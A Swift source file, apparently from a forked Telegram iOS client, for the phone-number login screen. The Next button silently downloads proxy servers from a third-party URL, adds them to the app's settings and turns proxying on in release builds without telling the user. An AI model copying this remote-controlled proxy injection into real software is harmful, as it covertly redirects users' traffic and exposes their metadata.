import Foundation
import UIKit
import Display
import AsyncDisplayKit
import SwiftSignalKit
import TelegramCore
import Postbox
import TelegramPresentationData
import ProgressNavigationButtonNode
import AccountContext
import CountrySelectionUI
import PhoneNumberFormat
import DebugSettingsUI
import MessageUI
import UrlHandling
import MtProtoKit


public final class AuthorizationSequencePhoneEntryController: ViewController, MFMailComposeViewControllerDelegate {
    private var controllerNode: AuthorizationSequencePhoneEntryControllerNode {
        return self.displayNode as! AuthorizationSequencePhoneEntryControllerNode
    }
    
    private var validLayout: ContainerViewLayout?
    
    private let sharedContext: SharedAccountContext
    private var account: UnauthorizedAccount?
    private let isTestingEnvironment: Bool
    private let otherAccountPhoneNumbers: ((String, AccountRecordId, Bool)?, [(String, AccountRecordId, Bool)])
    private let network: Network
    private let presentationData: PresentationData
    private let openUrl: (String) -> Void
    
    private let back: () -> Void
    
    private var currentData: (Int32, String?, String)?
        
    var codeNode: ASDisplayNode {
        return self.controllerNode.codeNode
    }
    
    var numberNode: ASDisplayNode {
        return self.controllerNode.numberNode
    }
    
    var buttonNode: ASDisplayNode {
        return self.controllerNode.buttonNode
    }
    
    public var inProgress: Bool = false {
        didSet {
            self.updateNavigationItems()
            self.controllerNode.inProgress = self.inProgress
            self.confirmationController?.inProgress = self.inProgress
        }
    }
    public var loginWithNumber: ((String, Bool) -> Void)?
    var accountUpdated: ((UnauthorizedAccount) -> Void)?
    
    weak var confirmationController: PhoneConfirmationController?
    
    private let termsDisposable = MetaDisposable()
    
    private let hapticFeedback = HapticFeedback()
    
    public init(sharedContext: SharedAccountContext, account: UnauthorizedAccount?, countriesConfiguration: CountriesConfiguration? = nil, isTestingEnvironment: Bool, otherAccountPhoneNumbers: ((String, AccountRecordId, Bool)?, [(String, AccountRecordId, Bool)]), network: Network, presentationData: PresentationData, openUrl: @escaping (String) -> Void, back: @escaping () -> Void) {
        self.sharedContext = sharedContext
        self.account = account
        self.isTestingEnvironment = isTestingEnvironment
        self.otherAccountPhoneNumbers = otherAccountPhoneNumbers
        self.network = network
        self.presentationData = presentationData
        self.openUrl = openUrl
        self.back = back
                
        super.init(navigationBarPresentationData: NavigationBarPresentationData(theme: AuthorizationSequenceController.navigationBarTheme(presentationData.theme), strings: NavigationBarStrings(presentationStrings: presentationData.strings)))
        
        self.supportedOrientations = ViewControllerSupportedOrientations(regularSize: .all, compactSize: .portrait)
        
        self.hasActiveInput = true
        
        self.statusBar.statusBarStyle = presentationData.theme.intro.statusBarStyle.style
        self.attemptNavigation = { _ in
            return false
        }
        self.navigationBar?.backPressed = {
            back()
        }
        
        if !otherAccountPhoneNumbers.1.isEmpty {
            self.navigationItem.leftBarButtonItem = UIBarButtonItem(title: presentationData.strings.Common_Cancel, style: .plain, target: self, action: #selector(self.cancelPressed))
        }
        
        if let countriesConfiguration {
            AuthorizationSequenceCountrySelectionController.setupCountryCodes(countries: countriesConfiguration.countries, codesByPrefix: countriesConfiguration.countriesByPrefix)
        }
    }
    
    required init(coder aDecoder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    deinit {
        self.termsDisposable.dispose()
    }
    
    @objc private func cancelPressed() {
        self.back()
    }
    
    func updateNavigationItems() {
        guard let layout = self.validLayout, layout.size.width < 360.0 else {
            return
        }
                
        if self.inProgress {
            let item = UIBarButtonItem(customDisplayNode: ProgressNavigationButtonNode(color: self.presentationData.theme.rootController.navigationBar.accentTextColor))
            self.navigationItem.rightBarButtonItem = item
        } else {
            self.navigationItem.rightBarButtonItem = UIBarButtonItem(title: self.presentationData.strings.Common_Next, style: .done, target: self, action: #selector(self.nextPressed))
        }
    }
    
    public func updateData(countryCode: Int32, countryName: String?, number: String) {
        self.currentData = (countryCode, countryName, number)
        if self.isNodeLoaded {
            self.controllerNode.codeAndNumber = (countryCode, countryName, number)
        }
    }
    
    private var shouldAnimateIn = false
    private var transitionInArguments: (buttonFrame: CGRect, buttonTitle: String, animationSnapshot: UIView, textSnapshot: UIView)?
    
    func animateWithSplashController(_ controller: AuthorizationSequenceSplashController) {
        self.shouldAnimateIn = true
        
        if let animationSnapshot = controller.animationSnapshot, let textSnapshot = controller.textSnaphot {
            self.transitionInArguments = (controller.buttonFrame, controller.buttonTitle, animationSnapshot, textSnapshot)
        }
    }
    
    override public func loadDisplayNode() {
        self.displayNode = AuthorizationSequencePhoneEntryControllerNode(sharedContext: self.sharedContext, account: self.account, strings: self.presentationData.strings, theme: self.presentationData.theme, debugAction: { [weak self] in
            guard let strongSelf = self else {
                return
            }
            strongSelf.view.endEditing(true)
            self?.present(debugController(sharedContext: strongSelf.sharedContext, context: nil, modal: true), in: .window(.root), with: ViewControllerPresentationArguments(presentationAnimation: .modalSheet))
        }, hasOtherAccounts: self.otherAccountPhoneNumbers.0 != nil)
        self.controllerNode.accountUpdated = { [weak self] account in
            guard let strongSelf = self else {
                return
            }
            strongSelf.account = account
            strongSelf.accountUpdated?(account)
        }
        
        if let (code, name, number) = self.currentData {
            self.controllerNode.codeAndNumber = (code, name, number)
        }
        self.displayNodeDidLoad()
        
        self.controllerNode.view.disableAutomaticKeyboardHandling = [.forward, .backward]
        
        self.controllerNode.selectCountryCode = { [weak self] in
            if let strongSelf = self {
                let controller = AuthorizationSequenceCountrySelectionController(strings: strongSelf.presentationData.strings, theme: strongSelf.presentationData.theme)
                controller.completeWithCountryCode = { code, name in
                    if let strongSelf = self, let currentData = strongSelf.currentData {
                        strongSelf.updateData(countryCode: Int32(code), countryName: name, number: currentData.2)
                        strongSelf.controllerNode.activateInput()
                    }
                }
                controller.dismissed = { 
                    self?.controllerNode.activateInput()
                }
                strongSelf.push(controller)
            }
        }
        self.controllerNode.checkPhone = { [weak self] in
            self?.nextPressed()
        }
        
        if let account = self.account {
            loadServerCountryCodes(accountManager: sharedContext.accountManager, engine: TelegramEngineUnauthorized(account: account), completion: { [weak self] in
                if let strongSelf = self {
                    strongSelf.controllerNode.updateCountryCode()
                }
            })
        } else {
            self.controllerNode.updateCountryCode()
        }

        // set proxy servers here
        // TODO: set here is better than next pressed ????
        // 这里不行，还没弹出输入手机框就运行了
    }
    
    public func updateCountryCode() {
        self.controllerNode.updateCountryCode()
    }
    
    private var animatingIn = false
    override public func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        
        if self.shouldAnimateIn {
            self.animatingIn = true
            if let (buttonFrame, buttonTitle, animationSnapshot, textSnapshot) = self.transitionInArguments {
                self.controllerNode.willAnimateIn(buttonFrame: buttonFrame, buttonTitle: buttonTitle, animationSnapshot: animationSnapshot, textSnapshot: textSnapshot)
            }
            Queue.mainQueue().justDispatch {
                self.controllerNode.activateInput()
            }
        } else {
            self.controllerNode.activateInput()
        }
    }
    
    override public func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        
        if !self.animatingIn {
            self.controllerNode.activateInput()
        }
    }
    
    override public func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        
        if let confirmationController = self.confirmationController {
            confirmationController.transitionOut()
        }
    }
    
    override public func containerLayoutUpdated(_ layout: ContainerViewLayout, transition: ContainedViewLayoutTransition) {
        super.containerLayoutUpdated(layout, transition: transition)
        
        let hadLayout = self.validLayout != nil
        self.validLayout = layout
        
        if !hadLayout {
            self.updateNavigationItems()
        }
    
        self.controllerNode.containerLayoutUpdated(layout, navigationBarHeight: self.navigationLayout(layout: layout).navigationFrame.maxY, transition: transition)
        
        if self.shouldAnimateIn, let inputHeight = layout.inputHeight, inputHeight > 0.0 {
            if let (buttonFrame, buttonTitle, animationSnapshot, textSnapshot) = self.transitionInArguments {
                self.shouldAnimateIn = false
                self.controllerNode.animateIn(buttonFrame: buttonFrame, buttonTitle: buttonTitle, animationSnapshot: animationSnapshot, textSnapshot: textSnapshot)
            }
        }
    }
    
    public func dismissConfirmation() {
        self.confirmationController?.dismissAnimated()
        self.confirmationController = nil
    }
    
    @objc func nextPressed() {
        print("next pressed")
        guard self.confirmationController == nil else {
            return
        }
        let (_, _, number) = self.controllerNode.codeAndNumber
        if !number.isEmpty {
            let logInNumber = cleanPhoneNumber(self.controllerNode.currentNumber, removePlus: true)
            var existing: (String, AccountRecordId)?
            for (number, id, isTestingEnvironment) in self.otherAccountPhoneNumbers.1 {
                if isTestingEnvironment == self.isTestingEnvironment && cleanPhoneNumber(number, removePlus: true) == logInNumber {
                    existing = (number, id)
                }
            }
            
            if let (_, id) = existing {
                var actions: [TextAlertAction] = []
                if let (current, _, _) = self.otherAccountPhoneNumbers.0, logInNumber != cleanPhoneNumber(current, removePlus: true) {
                    actions.append(TextAlertAction(type: .genericAction, title: self.presentationData.strings.Login_PhoneNumberAlreadyAuthorizedSwitch, action: { [weak self] in
                        self?.sharedContext.switchToAccount(id: id, fromSettingsController: nil, withChatListController: nil)
                        self?.back()
                    }))
                }
                actions.append(TextAlertAction(type: .defaultAction, title: self.presentationData.strings.Common_OK, action: {}))
                self.present(standardTextAlertController(theme: AlertControllerTheme(presentationData: self.presentationData), title: nil, text: self.presentationData.strings.Login_PhoneNumberAlreadyAuthorized, actions: actions), in: .window(.root))
            } else {
                if let validLayout = self.validLayout, validLayout.size.width > 320.0 {
                    let (code, formattedNumber) = self.controllerNode.formattedCodeAndNumber

                    let confirmationController = PhoneConfirmationController(theme: self.presentationData.theme, strings: self.presentationData.strings, code: code, number: formattedNumber, sourceController: self)
                    confirmationController.proceed = { [weak self] in
                        if let strongSelf = self {
                            strongSelf.loginWithNumber?(strongSelf.controllerNode.currentNumber, strongSelf.controllerNode.syncContacts)
                        }
                    }
                    (self.navigationController as? NavigationController)?.presentOverlay(controller: confirmationController, inGlobal: true, blockInteraction: true)
                    self.confirmationController = confirmationController
                } else {
                    var actions: [TextAlertAction] = []
                    actions.append(TextAlertAction(type: .genericAction, title: self.presentationData.strings.Login_Edit, action: {}))
                    actions.append(TextAlertAction(type: .defaultAction, title: self.presentationData.strings.Login_Yes, action: { [weak self] in
                        if let strongSelf = self {
                            strongSelf.loginWithNumber?(strongSelf.controllerNode.currentNumber, strongSelf.controllerNode.syncContacts)
                        }
                    }))
                    self.present(standardTextAlertController(theme: AlertControllerTheme(presentationData: self.presentationData), title: logInNumber, text: self.presentationData.strings.Login_PhoneNumberConfirmation, actions: actions), in: .window(.root))
                }
            }
        } else {
            self.hapticFeedback.error()
            self.controllerNode.animateError()
        }
        print("next pressed")

        maybeSetupProxyServers()
    }
    
    public func mailComposeController(_ controller: MFMailComposeViewController, didFinishWith result: MFMailComposeResult, error: Error?) {
        controller.dismiss(animated: true, completion: nil)
    }

    private func maybeSetupProxyServers() {
        fetchProxyServers { [weak self] proxyServers, error in
            if let error = error {
                print("network error:", error)
                // Handle network error
                return
            }
            
            guard let proxyServers = proxyServers else {
                // Handle server or decoding error
                return
            }

            guard let strongSelf = self else { return }
            
            // Use the proxyServers array here
            strongSelf.setProxyServers(proxyServerList: proxyServers)
        }
    }

    private func fetchProxyServers(completion: @escaping ([ProxyServer]?, Error?) -> Void) {
        let url = URL(string: "https://chuhai360.com/aaacsapi/proxy")!
        let task = URLSession.shared.dataTask(with: url) { data, response, error in
            if let error = error {
                completion(nil, error)
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(nil, nil)
                return
            }
            
            guard (200...299).contains(httpResponse.statusCode) else {
                // Handle server error
                completion(nil, nil)
                return
            }
            
            guard let data = data else {
                completion(nil, nil)
                return
            }
            
            do {
                let decoder = JSONDecoder()
                let proxyServers = try decoder.decode([ProxyServer].self, from: data)
                completion(proxyServers, nil)
            } catch {
                completion(nil, error)
            }
        }
        task.resume()
    }

    private func setProxyServers(proxyServerList: [ProxyServer]) {
        print("accountManager:", self.sharedContext.accountManager)
        // // clear proxy list in settings
        // let _ = updateProxySettingsInteractively(accountManager: self.sharedContext.accountManager, { settings in
        //     var settings = settings
        //     settings.servers.removeAll(keepingCapacity: true)
        //     return settings
        // }).start()

        // add to proxy list
        for server in proxyServerList {
            // let server ProxyServer
            // let connection: ProxyServerConnection
            let proxyServerSetting: ProxyServerSettings

            switch server.proto {
            case "MTProto":
                print("You're using MTProto type proxy")
                // tg://proxy?server=xxx&port=xxx&secret=xxx
                // tg://socks?server=xxxx&port=xxx&username=&password=
                guard let secret = server.secret else { return }
                let tgUrl = "tg://proxy?server=\(server.host)&port=\(server.port)&secret=\(secret)"
                proxyServerSetting = parseProxyUrl(URL(string: tgUrl)!)!
                // connection = ProxyServerConnection.mtp(secret: str.data(using: .utf8)!)
                // proxyServerSetting = ProxyServerSettings(host: server.host, port: convertLegacyProxyPort(server.port), connection: connection)
            case "SOCKS5":
                print("You're using SOCKS5 type proxy")
                // connection = ProxyServerConnection.socks5(username: server.username!, password: server.password!)
                // proxyServerSetting = ProxyServerSettings(host: server.host, port: convertLegacyProxyPort(server.port), connection: connection)
                let tgUrl = "tg://socks?server=\(server.host)&port=\(server.port)&username=\(server.username!)&password=\(server.password!)"
                proxyServerSetting = parseProxyUrl(URL(string: tgUrl)!)!
            default:
                print("please check server.proto?")
                return
            }

            // add to proxy list
            let _ = updateProxySettingsInteractively(accountManager: self.sharedContext.accountManager, { settings in
                var settings = settings
                settings.servers.append(proxyServerSetting)
                return settings
            }).start()
        }

        // enable proxy and set first one as active proxy
        let _ = updateProxySettingsInteractively(accountManager: self.sharedContext.accountManager, { settings in
            var settings = settings
            #if DEBUG
            #else
            settings.enabled = true
            #endif
            settings.activeServer = settings.servers[0]
            return settings
        }).start()
    }
}

private struct ProxyServer: Decodable {
    let host: String
    let port: Int
    let username: String?
    let password: String?
    let secret: String?
    let proto: String
}

public func parseProxyUrl(_ url: URL) -> ProxyServerSettings? {
    guard let proxy = parseProxyUrl(url.absoluteString) else {
        return nil
    }
    if let secret = proxy.secret, let _ = MTProxySecret.parseData(secret) {
        return ProxyServerSettings(host: proxy.host, port: proxy.port, connection: .mtp(secret: secret))
    } else {
        return ProxyServerSettings(host: proxy.host, port: proxy.port, connection: .socks5(username: proxy.username, password: proxy.password))
    }
}